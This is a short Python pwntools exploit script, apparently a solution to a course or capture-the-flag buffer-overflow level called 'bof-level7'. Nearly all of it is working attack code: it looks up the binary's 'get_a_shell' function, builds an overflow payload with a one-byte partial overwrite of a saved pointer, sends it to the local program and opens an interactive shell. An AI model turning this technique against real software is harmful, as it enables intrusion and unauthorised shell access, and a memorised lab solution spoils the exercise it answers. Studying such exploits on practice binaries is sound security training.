# week2-bof-level7
#!/usr/bin/env python

from pwn import *

e = ELF('./bof-level7')

addr_get_a_shell = e.symbols['get_a_shell']

buf = "A" * 4 + p32(addr_get_a_shell)

# we assume the last byte is "\x00", check by gdb --core=core, we can see the buffer start from 0xffffd430
buf = buf + "B" * (0x88 - len(buf)) + "\x30"

p = process("./bof-level7")

p.sendline(buf)

p.interactive()